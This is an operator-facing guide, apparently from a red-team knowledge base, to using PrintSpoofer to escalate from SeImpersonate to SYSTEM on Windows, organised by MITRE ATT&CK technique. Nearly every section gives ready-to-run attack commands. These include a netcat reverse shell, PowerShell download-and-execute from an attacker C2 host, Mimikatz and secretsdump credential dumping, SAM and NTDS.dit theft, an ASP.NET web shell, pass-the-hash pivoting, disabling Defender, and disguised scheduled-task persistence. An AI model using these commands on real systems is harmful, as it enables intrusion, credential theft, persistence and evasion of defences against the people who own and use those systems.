# PrintSpoofer — Hands-On Use Cases

## Basic SYSTEM command execution

**MITRE ATT&CK:** T1134.003 (Access Token Manipulation), T1548.002 (Abuse Elevation Control Mechanism)

**Scenario:** You have shell access as a service account (e.g., IIS application pool identity, MSSQL service account) with `SeImpersonate` privilege. You need a SYSTEM-context shell to access files/registry that require higher privilege.

```bash
PrintSpoofer.exe -c "cmd /c whoami > C:\temp\whoami.txt"
```

**Step-by-step:**
1. Run the command above from your current low-privilege shell.
2. PrintSpoofer will spawn `cmd.exe` as SYSTEM, execute `whoami`, and redirect output to `C:\temp\whoami.txt`.
3. Verify by reading the output file; it should contain `NT AUTHORITY\SYSTEM`.

**Operator notes:**
- Output redirection (`> C:\temp\whoami.txt`) is **recommended** because without `-i` (interactive), the spawned process runs backgrounded and its console output is lost.
- Ensure `C:\temp\` is writable by the service account, or use a writable directory like `%TEMP%` or the service account's own temp folder.

---

## Interactive SYSTEM shell (live output)

**MITRE ATT&CK:** T1134.003, T1548.002

**Scenario:** You want a live, interactive SYSTEM shell where you can type commands and see output in real-time.

```bash
PrintSpoofer.exe -i -c "cmd.exe"
```

**Step-by-step:**
1. Run the command above.
2. You will get a new `cmd.exe` prompt running as SYSTEM.
3. Type commands normally; they execute in SYSTEM context.
4. Type `exit` to close the shell.

**Operator notes:**
- The `-i` flag is key here—it attaches the spawned process's console to your current session.
- This is most useful in an interactive session (e.g., SSH, RDP, or a reverse shell where you're actively typing).
- If used from a non-interactive C2 payload, the interactive shell may not connect back properly; use output redirection instead.

---

## Reverse shell payload (staged C2)

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application), T1548.002, T1059.003 (Command and Scripting Interpreter: Windows Command Shell)

**Scenario:** You have an IIS reverse shell, and you want to pivot to SYSTEM, then execute a multi-stage C2 payload (e.g., Sliver, Cobalt Strike).

**Stage 1: Execute a reverse shell binary as SYSTEM**

```bash
# On attacker machine: set up listener
# nc -lvnp 4444

# From IIS shell (low privilege):
PrintSpoofer.exe -c "C:\Windows\Temp\nc.exe -e cmd 10.10.10.10 4444"
```

**Step-by-step:**
1. First, upload `nc.exe` (netcat) to the target in a writable location (e.g., `C:\Windows\Temp\`).
2. On your attacker machine, start a netcat listener: `nc -lvnp 4444`.
3. Run the PrintSpoofer command above from the IIS shell.
4. PrintSpoofer spawns `nc.exe` as SYSTEM, which connects back to your listener.
5. You now have a SYSTEM-context reverse shell.

**Stage 2: Download and execute a full C2 payload**

```bash
# From SYSTEM reverse shell:
powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.10.10:8080/implant.ps1')"
```

Or, if using a compiled binary (e.g., Sliver executable):

```bash
C:\Windows\Temp\implant.exe
```

**Operator notes:**
- The netcat stage is the bridge—you get SYSTEM context, then pull down a full implant.
- Ensure `nc.exe` exists on the target before running PrintSpoofer; PrintSpoofer does not upload files.
- If the target can reach your C2 server over HTTP/HTTPS, directly stage the implant via PowerShell.

---

## Credential dumping as SYSTEM

**MITRE ATT&CK:** T1003.001 (LSASS Memory), T1003.004 (LSA Secrets), T1003.005 (Credential Files)

**Scenario:** You need to dump local credentials (SAM, LSA Secrets) or domain credentials. Both require SYSTEM privilege.

**Option A: Use Mimikatz (precompiled binary)**

```bash
PrintSpoofer.exe -c "C:\Windows\Temp\mimikatz.exe sekurlsa::logonpasswords"
```

But output is lost. Redirect to a file:

```bash
PrintSpoofer.exe -c "C:\Windows\Temp\mimikatz.exe sekurlsa::logonpasswords > C:\Windows\Temp\mimi_output.txt"
```

**Option B: Use Impacket secretsdump (if Python installed)**

```bash
PrintSpoofer.exe -c "python C:\Windows\Temp\secretsdump.py -sam C:\Windows\System32\config\sam -system C:\Windows\System32\config\system -security C:\Windows\System32\config\security LOCAL"
```

**Option C: Use native tools (reg.exe + offline analysis)**

```bash
PrintSpoofer.exe -c "cmd /c reg save hklm\sam C:\Windows\Temp\sam.hive && reg save hklm\system C:\Windows\Temp\system.hive && reg save hklm\security C:\Windows\Temp\security.hive"
```

Then exfiltrate the `.hive` files and run offline tools (secretsdump, hashcat, etc.) on your attacker machine.

**Operator notes:**
- Mimikatz + output redirection is the quickest for live credential access.
- Registry hive copies via `reg save` are fileless-friendly but require offline parsing.
- Ensure output files (`*.hive`, `mimi_output.txt`) are written to a location you can read (e.g., `C:\Windows\Temp\`, IIS web root, or SMB-accessible share).

---

## WebShell SYSTEM read/write (IIS context)

**MITRE ATT&CK:** T1505.004 (Server Software Component: IIS Modules), T1190 (Exploit Public-Facing Application)

**Scenario:** You have a web shell running in IIS (typically as the IIS application pool identity, e.g., `IIS APPPOOL\DefaultAppPool`). You need to read/write files outside the IIS app folder, which requires SYSTEM.

**Example: Read a sensitive application config file**

```bash
PrintSpoofer.exe -c "cmd /c type C:\Windows\System32\config\sam > C:\inetpub\wwwroot\output.txt"
```

Then access `http://target/output.txt` from your browser to retrieve the file.

**Example: Write a new ASP.NET shell**

```bash
PrintSpoofer.exe -c "powershell -NoProfile -Command \"[System.IO.File]::WriteAllText('C:\\inetpub\\wwwroot\\shell2.aspx', '<%@ Page Language=\"C#\" %><%@ Import Namespace=\"System.Diagnostics\" %><%Process.Start(\"cmd.exe\", \"/c \" + Request.QueryString[\"cmd\"]); %>')\" "
```

(Note: This is a single-line PowerShell command with escaped quotes; format carefully.)

**Operator notes:**
- IIS web roots are typically writable by the IIS identity but not readable by unprivileged users.
- Writing new ASP.NET shells directly to `wwwroot` is noisy in IIS logs but effective.
- Consider staging files in `C:\Windows\Temp\` first, then copying to `wwwroot`.

---

## Domain credential access via DCSync

**MITRE ATT&CK:** T1003.006 (DCSync)

**Scenario:** You have code execution on a domain-joined machine, and you want to pull the entire NTDS.dit database (all domain user hashes and secrets). This requires SYSTEM on a domain controller, or SYSTEM on any domain-joined machine with replication permissions.

```bash
PrintSpoofer.exe -c "python C:\Windows\Temp\secretsdump.py -dc-ip 10.10.10.5 -all -history domain.local/DA_account:Password@10.10.10.5"
```

Or, if you're already on the DC:

```bash
PrintSpoofer.exe -c "cmd /c copy C:\Windows\System32\ntds.dit C:\Windows\Temp\ntds.dit && copy C:\Windows\System32\config\system C:\Windows\Temp\system"
```

**Operator notes:**
- If targeting a DC, the copy-and-exfil approach is simpler.
- If targeting a domain-joined workstation, you need SYSTEM + pre-existing replication permissions (e.g., Domain Admin or equivalent), which is rare.
- Cross-link to `Impacket/secretsdump/` for full DCSync mechanics.

---

## Lateral movement: Dump credentials, then pivot to other machines

**MITRE ATT&CK:** T1550.003 (Use Alternate Authentication Material: Pass-the-Hash), T1550.002 (Use Alternate Authentication Material: Pass-the-Ticket)

**Scenario:** You escalate to SYSTEM on a workstation, dump NTLM hashes or Kerberos tickets, then use those credentials to access other machines on the network.

**Step 1: Escalate and dump hashes**

```bash
PrintSpoofer.exe -c "mimikatz sekurlsa::logonpasswords > C:\Windows\Temp\hashes.txt"
```

**Step 2: Use the hashes to access another machine (pass-the-hash)**

```bash
# From your attacker machine, using Impacket:
python psexec.py -hashes :NTHASH domain.local/user@target-machine -c "whoami"
```

Or use the tickets via Kerberos:

```bash
# From SYSTEM context, dump tickets:
PrintSpoofer.exe -c "mimikatz kerberos::list > C:\Windows\Temp\tickets.txt"

# Export and use on attacker machine:
# (Parse the tickets, then inject via your C2)
```

**Operator notes:**
- Hashes are usable immediately (pass-the-hash does not require re-authentication).
- Kerberos tickets have a time limit (typically 10 hours for a TGT, 1 hour for a TGS) but are valid across the domain.
- Combine with `Rubeus` or `Mimikatz kerberos::ptt` for ticket injection.
- Cross-link to `Rubeus/` and `Impacket/psexec/` for subsequent lateral movement.

---

## Disable Windows Defender as SYSTEM

**MITRE ATT&CK:** T1562.001 (Impair Defenses: Disable or Modify Tools)

**Scenario:** You want to disable Windows Defender or Windows Update to avoid automated remediation.

```bash
PrintSpoofer.exe -c "powershell -NoProfile -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\""
```

Or disable the Windows Update service:

```bash
PrintSpoofer.exe -c "cmd /c net stop wuauserv && sc config wuauserv start=disabled"
```

**Operator notes:**
- Disabling Defender generates event logs (Event 5001 in Windows Defender logs), but as SYSTEM, you have the privilege to do so.
- Modern Windows 10+ systems may have tamper protection enabled, which prevents disabling Defender even as SYSTEM—check for this limitation in advance.
- Disabling Windows Update prevents security patches from installing.

---

## Scheduled task creation (persistence)

**MITRE ATT&CK:** T1053.005 (Scheduled Task/Job)

**Scenario:** You use SYSTEM context to create a scheduled task that runs a payload on reboot or on a timer, ensuring persistence.

```bash
PrintSpoofer.exe -c "schtasks /create /tn \"WindowsUpdate\" /tr \"C:\Windows\Temp\implant.exe\" /sc onboot /ru system"
```

**Operator notes:**
- The task name `WindowsUpdate` blends in with legitimate Windows tasks.
- `/ru system` ensures the task runs as SYSTEM.
- This is a follow-on action to PrintSpoofer, not a standalone PrintSpoofer use case, but SYSTEM privilege is required to create a `/ru system` task.
- Cross-link to `Windows/10 - Persistence Mechanisms.md` for full scheduled-task forensics.

---

## RDP session targeting (multi-session environments)

**MITRE ATT&CK:** T1548.002 (Abuse Elevation Control Mechanism)

**Scenario:** You have code execution in an RDP session (Session 1+) as a low-privilege user. An administrator is logged in on Session 2. You want to inject malicious code into the admin's session.

```bash
# From Session 1 (your low-privilege session):
PrintSpoofer.exe -d 2 -c "cmd /c echo malicious_command > C:\Windows\Temp\admin_payload.txt"
```

This spawns the command in Session 2 (the admin's session).

**Operator notes:**
- The `-d <SessionID>` flag is rare in the wild—most post-exploitation focuses on the current session.
- Requires Print Spooler to run in all sessions (usually the case).
- Practical for injecting code directly into an admin's active session without RDP hijacking or man-in-the-middle attacks.
- Session IDs can be enumerated via `query session` or `Get-Process | Select SessionId`.

---

## PowerShell Empire or Sliver agent deployment

**MITRE ATT&CK:** T1059.001 (Command and Scripting Interpreter: PowerShell), T1071.001 (Application Layer Protocol: Web Protocols)

**Scenario:** You have a low-privilege shell and want to deploy a full C2 agent (PowerShell Empire or Sliver) as SYSTEM to blend into legitimate activity.

```bash
# Deploy Sliver agent as SYSTEM:
PrintSpoofer.exe -c "powershell -NoProfile -Command \"IEX(New-Object System.Net.WebClient).DownloadString('http://c2.attacker.com:8080/implant.ps1')\""
```

Or directly execute a Sliver binary:

```bash
PrintSpoofer.exe -c "C:\Windows\Temp\sliver-agent.exe"
```

**Operator notes:**
- The SYSTEM context blends into legitimate Windows activity, making detection harder.
- Ensure your C2 server is reachable from the target (HTTP/HTTPS egress).
- Sliver agents are typically smaller and faster than Mimikatz for initial staging.
- Cross-link to `Sliver/` for agent-specific evasion and configuration options.

---

## Summary of Command Patterns

All PrintSpoofer invocations follow this pattern:

```bash
PrintSpoofer.exe [OPTIONS] -c "<command>"
```

Where:
- `<command>` is any executable or batch command you want to run as SYSTEM.
- Output redirection (`> file.txt`) is critical for non-interactive shells.
- `-i` enables interactive mode (live console output).
- `-d <SessionID>` targets a specific RDP session.

Because PrintSpoofer does not persist and leaves no on-disk footprint, subsequent C2 stages (Sliver, Cobalt Strike, Mimikatz, credential dump tools) must be either:
1. **Pre-staged** on the target before calling PrintSpoofer.
2. **Downloaded via PowerShell/curl** as part of the command string.
3. **Injected into memory** by a C2 agent already running.

PrintSpoofer itself is the bridge—the mechanism to elevate from `SeImpersonate` to SYSTEM in one shot. Everything beyond that is your C2/payload strategy.
